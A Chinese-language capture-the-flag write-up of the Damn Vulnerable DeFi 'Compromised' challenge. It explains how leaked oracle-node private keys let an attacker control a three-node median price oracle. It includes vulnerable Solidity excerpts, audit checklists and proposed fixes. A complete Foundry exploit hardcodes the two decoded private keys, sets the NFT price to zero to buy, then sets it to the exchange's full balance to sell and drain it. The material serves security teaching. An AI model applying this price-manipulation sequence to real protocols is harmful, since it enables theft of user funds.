# Compromised 

## 一、题目简述

项目上线了基于 DVNFT 的 NFT 交易交易所，价格由链上预言机 `TrustfulOracle` 决定。预言机采用**三可信节点中位数报价机制**，三个授权节点可自主上报 NFT 价格，交易所完全采信预言机价格完成 NFT 买卖交易。

攻击者初始仅持有 **0\.1 ETH**，交易所存有大量 ETH。题目给出服务器泄露的两段十六进制密文，核心考点为**预言机可信节点私钥泄露导致价格操纵**，目标是掏空交易所全部资金并转入回收账户。

## 二、审计视角（逐行抓脆弱点）

### 1\. 核心脆弱代码1：可信节点无风控报价

预言机仅做角色权限校验，无任何价格波动、数值范围限制，可信节点可任意修改价格。

```solidity
function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
    _setPrice(msg.sender, symbol, newPrice);
}
```

漏洞细节：只要拥有可信节点权限，可将 NFT 价格随意改为 0、合约全部余额、极大值，无任何风控拦截。

### 2\. 核心脆弱代码2：中位数价格算法漏洞

三节点预言机，仅需控制 **2/3 节点** 即可完全掌控中位数价格。

```solidity
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = getAllPricesForSymbol(symbol);
    LibSort.insertionSort(prices);
    if (prices.length % 2 == 0) {
        uint256 leftPrice = prices[(prices.length / 2) - 1];
        uint256 rightPrice = prices[prices.length / 2];
        return (leftPrice + rightPrice) / 2;
    } else {
        return prices[prices.length / 2];
    }
}
```

漏洞细节：3个节点报价排序后取中间值，控制任意两个节点即可篡改最终生效价格。

### 3\. 核心脆弱代码3：交易所无条件信任预言机

交易所买卖 NFT 的价格完全依赖预言机，无自研价格校验、无价格熔断、无波动限制。

```solidity
// 买入价格校验
uint256 price = oracle.getMedianPrice(token.symbol());
if (msg.value < price) {
    revert InvalidPayment();
}

// 卖出价格校验
uint256 price = oracle.getMedianPrice(token.symbol());
if (address(this).balance < price) {
    revert NotEnoughFunds();
}
```

## 三、开发者默认安全假设（误区）

1. **默认可信节点私钥绝对安全**：开发者认为官方节点不会被入侵、私钥不会泄露，未做任何兜底风控。

2. **默认多节点中位数绝对安全**：误以为3节点冗余可以抵御攻击，忽略 2/3 节点受控即可完全控价。

3. **默认预言机报价可信**：交易所完全依赖外部预言机，无本地价格校验、无熔断机制。

4. **默认价格不会恶意篡改**：未限制单次价格修改幅度、无价格上下限、无时间加权校验。

## 四、同类项目通用审计盯点（重点）

1. **预言机权限审计**：所有报价节点、管理员账户是否存在私钥泄露、权限过大问题。

2. **中位数预言机通用漏洞**：节点数量为 N 时，控制半数以上节点即可操控价格。

3. **价格风控必查**：是否存在价格熔断、最大波动限制、TWAP 时间加权平均价格校验。

4. **外部依赖风险**：合约核心资产逻辑（买卖、清算）不能完全依赖单一外部预言机。

5. **管理员/节点操作日志**：无作恶惩罚、无权限撤销、无紧急暂停机制均属于高危漏洞。

## 五、完整解题思路

1. **解密获取权限**：将题目泄露的两段十六进制密文，经过 Hex 解码 \+ Base64 解码，获取两个可信预言机节点的真实私钥。

2. **篡改低价**：使用两个受控节点将 NFT 价格改为 0，玩家仅用极少 ETH（0\.1ETH）免费买入 NFT。

3. **篡改高价**：再次操控两个预言机，将 NFT 价格改为交易所全部余额。

4. **套利掏空资金**：玩家授权 NFT 给交易所，高价卖出 NFT，掏空交易所所有 ETH。

5. **完成通关**：将套利所得全部资金转入官方 recovery 回收账户。

## 六、报错复盘

### 报错1：AccessControlUnauthorizedAccount 权限不足

**报错原因**：前期解码逻辑错误，仅单层解码，获取到伪造私钥，对应地址并非官方可信报价节点，无 `TRUSTED_SOURCE_ROLE` 角色，无法调用 `postPrice`。

**解决方案**：采用双层解码（Hex→Base64→私钥），获取题目原生真实私钥。

### 报错2：staticcall`s are not allowed after broadcast

**报错原因**：Foundry 语法限制，`vm.broadcast()` 为单指令广播，执行后**禁止读取链上静态数据（staticcall）**，代码中在 broadcast 后调用 `nft.symbol()` 触发报错。

**解决方案**：1\. 提前读取链上数据；2\. 替换单指令 `broadcast` 为区间模式 `startBroadcast / stopBroadcast`。

### 报错3：地址校验和错误

**报错原因**：手动硬编码地址大小写不规范，不符合 Solidity EIP\-55 校验和规范，编译失败。

**解决方案**：放弃硬编码地址，通过私钥 `vm.addr()` 生成地址，规避格式错误。

## 七、EXP

```solidity
function test_compromised() public checkSolvedByPlayer {
    // 题目双层解码得出的真实可信节点私钥
    uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

    // 提前读取链上数据，规避 broadcast staticcall 报错
    string memory sym = nft.symbol();

    // 1. 将预言机价格篡改至 0，低成本购入NFT
    vm.startBroadcast(pk1);
    oracle.postPrice(sym, 0);
    vm.stopBroadcast();

    vm.startBroadcast(pk2);
    oracle.postPrice(sym, 0);
    vm.stopBroadcast();

    // 玩家买入NFT
    vm.prank(player);
    uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();

    // 2. 将价格篡改至交易所全部余额，实现套利掏空
    vm.startBroadcast(pk1);
    oracle.postPrice(sym, EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopBroadcast();

    vm.startBroadcast(pk2);
    oracle.postPrice(sym, EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopBroadcast();

    // 授权NFT并卖出，掏空交易所资金
    vm.startPrank(player);
    nft.approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);

    // 资金转入回收账户，完成题目
    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopPrank();
}
```

## 八、合约修复方案

1. **增加价格风控**：限制单次价格修改幅度（如单次浮动不超过10%），禁止价格归零、暴涨暴跌。

2. **优化预言机算法**：引入 TWAP 时间加权平均价格，替代瞬时中位数报价，抵抗瞬时价格操纵。

3. **增加权限管控**：新增节点权限撤销、作恶节点黑名单机制。

4. **增加熔断机制**：价格异常波动时，自动暂停交易所买卖功能。

5. **多重价格校验**：交易所结合多预言机、链下数据源交叉校验，不单一依赖外部合约。
